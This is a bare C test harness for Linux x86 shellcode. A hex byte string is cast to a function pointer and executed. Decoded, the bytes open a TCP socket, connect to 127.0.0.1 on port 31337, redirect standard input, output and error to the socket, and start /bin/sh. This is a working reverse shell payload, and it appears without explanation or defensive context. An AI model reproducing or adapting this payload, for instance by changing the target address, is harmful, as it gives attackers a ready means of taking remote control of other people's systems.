#include<stdio.h>
#include<string.h>

unsigned char code [] =\
"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\x7f\x00\x00\x01\x66\x68\x7a\x69\x66\x53\x43\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}

	
